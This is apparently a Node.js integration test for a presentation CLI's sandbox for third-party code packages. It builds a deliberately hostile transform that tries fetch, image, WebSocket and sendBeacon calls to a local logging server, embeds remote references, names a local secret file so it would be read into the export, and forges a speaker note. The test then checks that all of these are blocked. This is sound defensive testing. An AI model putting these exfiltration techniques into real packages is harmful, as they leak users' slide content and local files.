/**
 * Integration: the CLI's door for code packages (contract note §9), driven through the REAL CLI
 * (lattice-emulator.js → PDF), with a network log (HARD RULE #23).
 *
 * A third-party code package, written here the way a stranger would bring one (a self-contained ES
 * module, nothing of Lattice's imported), installs into a fixture store. Its transform is hostile:
 * at load and on every slide it tries the network (fetch, an image, a WebSocket, a beacon), and the
 * section it returns carries every remote reference a slide can hold (an image, a srcset, a video
 * poster, an SVG image, a CSS url(), a link). A local HTTP + WebSocket server counts what reaches it.
 *
 *   CONTROL   the same markup AUTHORED in the deck, rendered with `--allow-remote`  → it fetches,
 *             so the log can see a PDF render reach the server
 *   REFUSED   the package installed but not approved                             → exit 1, the
 *             package named, the `trust` command given, 0 requests
 *   APPROVED  the package approved at its SHA-256, rendered with `--allow-remote` → it draws, 0
 *             requests: `--allow-remote` is the author's choice, never a stranger's code's network
 *   CHANGED   one byte of the code changed after approval                         → refused again
 *
 * The returned section also names a LOCAL file, twice: as a logo mask (a pass after the door used to
 * read that file into the export) and as a relative image. Neither address survives.
 *
 * Slow tier: four CLI renders.
 */

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const { execFile } = require('node:child_process');

const ROOT = path.join(__dirname, '..', '..', '..');
const EMULATOR = path.join(ROOT, 'lattice-emulator.js');
const TIMEOUT = 300000;
const SETTLE_MS = 1500;

const tmp = (p) => fs.mkdtempSync(path.join(os.tmpdir(), `lattice-door-${p}-`));

/** The remote references a returned section carries, every one pointing at the log. */
const remoteMarkup = (H) =>
  `<img src="${H}/img" alt=""><img srcset="${H}/srcset 1x" alt=""><video poster="${H}/poster"></video>` +
  `<svg width="4" height="4"><image href="${H}/svgimage" width="4" height="4"></image></svg>` +
  `<span style="background-image:url(${H}/cssurl)">x</span><a href="${H}/link">link</a>`;

/**
 * Local addresses a package might invent: a logo mask naming a file (the CLI's logo-mark pass reads
 * the file a mask names and splices it into the export, which is how the red team read a local file
 * out), and a relative image. The door keeps only addresses the slide it was handed already held.
 */
const localMarkup = (secretFile) => `<span class="logo-mark" style="--logo-mask:url('${secretFile}')"></span><img src="secret.png" alt="">`;

/** An engine channel a package might forge: a speaker note for the presenter view (the inversion lens). */
const forgedNote = '<aside class="lattice-notes" hidden data-slide="1">FORGED-NOTE</aside>';

/** The stranger's transform: tries the network, then returns the slide with the remote and local markup in it. */
const hostileTransform = (H, P, secretFile) => `
try { fetch("${H}/atload").catch(function(){}); } catch (e) {}
function tally(slide, kit) {
  try { fetch("${H}/fetch").catch(function(){}); } catch (e) {}
  try { new Image().src = "${H}/image"; } catch (e) {}
  try { new WebSocket("ws://127.0.0.1:${P}/websocket"); } catch (e) {}
  try { navigator.sendBeacon("${H}/beacon", slide.html); } catch (e) {}
  var n = Number((/<li>(\\d+)<\\/li>/.exec(slide.html) || [])[1] || 0);
  var marks = "";
  for (var i = 0; i < n; i++) marks += '<span class="tally-mark">' + (i + 1) + "</span>";
  // Padded with newlines, as a template literal would be (the checker's crash).
  return "\\n" + slide.html.replace(/<ul>[\\s\\S]*?<\\/ul>/, '<div class="tally-marks" data-count="' + n + '">' + marks + "</div>" + ${JSON.stringify(remoteMarkup(H) + localMarkup(secretFile) + forgedNote)}) + "\\n";
}
export { tally as default };
`;

const pkgFiles = (code) => ({
  'tally.manifest.json': JSON.stringify({ name: 'tally', type: 'component', format: 1 }),
  'tally.styles.css': 'section.tally .tally-marks { display: flex; gap: 0.5em; color: var(--accent); }\n',
  'tally.gallery.md': '<!-- _class: tally -->\n\n## Tally\n\n- 3\n',
  'tally.transform.js': code,
});

function render(home, deck, extra = []) {
  const dir = tmp('deck');
  fs.writeFileSync(path.join(dir, 'deck.md'), deck);
  const out = path.join(dir, 'deck.pdf');
  return new Promise((resolve) => {
    // Asynchronous on purpose: the log's server runs in THIS process, and a synchronous spawn
    // would stall it, so a request the render made would hang uncounted.
    execFile(process.execPath, [EMULATOR, path.join(dir, 'deck.md'), out, ...extra], { encoding: 'utf8', timeout: TIMEOUT, env: { ...process.env, LATTICE_HOME: home } }, (error, stdout, stderr) => {
      resolve({ status: error ? (error.code ?? 1) : 0, stdout, stderr, pdf: fs.existsSync(out) ? out : null, text: `${stdout}\n${stderr}` });
    });
  });
}

describe('code packages: the CLI door', { timeout: TIMEOUT }, () => {
  let server;
  let hits;
  let H;
  let P;
  let home;
  let code;
  let secret;
  const { main } = require('../../../lib/packages/cli.js');
  const cli = async (argv) => {
    const out = [];
    const status = await main(argv, { log: (s) => out.push(s), err: (s) => out.push(s), ask: async () => false, probe: async () => 'probe skipped in this test' });
    return { status, text: out.join('\n') };
  };
  const settle = () => new Promise((r) => setTimeout(r, SETTLE_MS));
  const deck = '---\ntheme: indaco\n---\n\n<!-- _class: tally -->\n\n## Three wins\n\n- 3\n\n<!-- the speaker note -->\n';

  test.before(async () => {
    hits = [];
    server = http.createServer((req, res) => {
      hits.push(req.url);
      res.end('x');
    });
    server.on('upgrade', (req, sock) => {
      hits.push(req.url);
      sock.destroy();
    });
    await new Promise((r) => server.listen(0, '127.0.0.1', r));
    P = server.address().port;
    H = `http://127.0.0.1:${P}`;
    home = tmp('home');
    secret = `SECRET-${process.pid}-${Date.now()}`;
    const secretFile = path.join(tmp('secret'), 'secret.svg');
    fs.writeFileSync(secretFile, `<svg xmlns="http://www.w3.org/2000/svg"><text>${secret}</text></svg>`);
    code = hostileTransform(H, P, secretFile);
    const src = tmp('src');
    fs.mkdirSync(path.join(src, 'tally'));
    for (const [f, b] of Object.entries(pkgFiles(code))) fs.writeFileSync(path.join(src, 'tally', f), b);
    process.env.LATTICE_HOME_BEFORE = process.env.LATTICE_HOME ?? '';
    process.env.LATTICE_HOME = home;
    const added = await cli(['add', path.join(src, 'tally')]);
    assert.equal(added.status, 0, added.text);
    assert.match(added.text, /carries code: tally\.transform\.js/);
    assert.match(added.text, /not approved: a render that uses component\/tally fails/);
  });
  test.after(() => {
    server?.close();
    process.env.LATTICE_HOME = process.env.LATTICE_HOME_BEFORE;
  });

  test('control: the same markup, authored in the deck with --allow-remote, reaches the log', async () => {
    hits.length = 0;
    const r = await render(tmp('empty-home'), `---\ntheme: indaco\n---\n\n## Authored\n\n${remoteMarkup(H)}\n`, ['--allow-remote']);
    await settle();
    assert.equal(r.status, 0, r.text);
    assert.ok(hits.length >= 3, `the control must reach the server, or the zeros below prove nothing (got ${JSON.stringify(hits)})`);
  });

  test('refused without consent: the render fails, names the package, and nothing is fetched', async () => {
    hits.length = 0;
    const r = await render(home, deck, ['--allow-remote']);
    await settle();
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /the deck uses the code package tally, and you have not approved its code \(sha256 [0-9a-f]{64}\)/);
    assert.match(r.stderr, /lattice packages trust component\/tally/);
    assert.equal(r.pdf, null, 'no PDF is written');
    assert.deepEqual(hits, []);
  });

  test('approved at its SHA-256: it draws, keeps the note, and reaches nothing, even with --allow-remote', async () => {
    const t = await cli(['trust', 'component/tally', '--yes']);
    assert.equal(t.status, 0, t.text);
    hits.length = 0;
    const r = await render(home, deck, ['--allow-remote']);
    await settle();
    assert.equal(r.status, 0, r.text);
    assert.match(`${r.stdout}${r.stderr}`, /code packages: tally — OS sandbox (on|OFF)/);
    assert.doesNotMatch(r.stderr, /did not draw/, 'the package must have drawn, or the zero below proves nothing');
    assert.deepEqual(hits, [], 'the package reached the network');
    // The HTML beside it: the transform's markup is there, with every remote reference gone.
    const dir = tmp('html');
    fs.writeFileSync(path.join(dir, 'deck.md'), deck);
    const done = await new Promise((resolve) => execFile(process.execPath, [EMULATOR, path.join(dir, 'deck.md'), path.join(dir, 'deck.html'), '--allow-remote'], { env: { ...process.env, LATTICE_HOME: home }, timeout: TIMEOUT }, (e) => resolve(e)));
    assert.equal(done, null);
    const out = fs.readFileSync(path.join(dir, 'deck.html'), 'utf8');
    assert.match(out, /class="tally-marks" data-count="3"><span class="tally-mark">1<\/span>/);
    assert.ok(!out.includes(`127.0.0.1:${P}`), 'no reference to the log survives in the output');
    assert.ok(!out.includes(secret), 'the local file the package named was read into the export');
    assert.match(out, /<span class="logo-mark"><\/span><img alt="">/, 'the invented local addresses are dropped, the elements kept');
    assert.doesNotMatch(out, /class="lattice-notes"[^>]*>[^<]*FORGED-NOTE/, 'a forged speaker note never reaches the presenter channel');
    assert.match(out, /the speaker note/);
    await settle();
    assert.deepEqual(hits, []);
  });

  test('the OS layer: as root on Linux, a Chromium the unprivileged user can run gets the OS sandbox, measured', async (t) => {
    const exe = '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';
    if (process.platform !== 'linux' || process.getuid?.() !== 0 || !fs.existsSync(exe)) return t.skip('needs root on Linux and a Chromium outside /root (the sandbox image has one at /opt/pw-browsers)');
    const { launchCodeSandbox } = require('../../../lib/core/os-sandbox.js');
    const s = await launchCodeSandbox(require('puppeteer'), { executablePath: exe });
    try {
      assert.equal(s.layer.os, 'on', s.layer.summary);
      assert.equal(s.layer.user, 'nobody');
    } finally {
      await s.close();
    }
  });

  test('approved with the OS sandbox on, rendered where it is off: refused before the package runs', async (t) => {
    const { launchCodeSandbox } = require('../../../lib/core/os-sandbox.js');
    const { detectChromeExecutable } = require('../../../lib/core/chrome-exec.js');
    const probe = await launchCodeSandbox(require('puppeteer'), { executablePath: detectChromeExecutable() || undefined });
    await probe.close();
    if (probe.layer.os === 'on') return t.skip('the default browser here gets the OS sandbox, so there is no weaker layer to refuse');
    const { grantTrust, codeDigest } = require('../../../lib/packages/trust.js');
    const { findInstalled } = require('../../../lib/packages/home.js');
    const inst = findInstalled(path.join(home, 'packages'), 'component', 'tally');
    grantTrust('component', 'tally', codeDigest(inst.pkg), { file: path.join(home, 'trust.json'), layer: 'on' });
    hits.length = 0;
    const r = await render(home, deck, ['--allow-remote']);
    await settle();
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /you approved the code package tally with the OS sandbox on, and this render's browser gives it off/);
    assert.equal(r.pdf, null);
    assert.deepEqual(hits, [], 'refused before any of its code ran');
    grantTrust('component', 'tally', codeDigest(inst.pkg), { file: path.join(home, 'trust.json'), layer: probe.layer.os });
  });

  test('changed code asks again: one byte after approval is refused', async () => {
    const file = path.join(home, 'packages', 'component', 'tally', 'tally.transform.js');
    fs.writeFileSync(file, `${code} `);
    hits.length = 0;
    const r = await render(home, deck);
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /have not approved its code/);
    const list = await cli(['list', '--type', 'component']);
    assert.match(list.text, /tally\s+installed {2}\(code, NOT approved: lattice packages trust component\/tally\)/);
  });
});
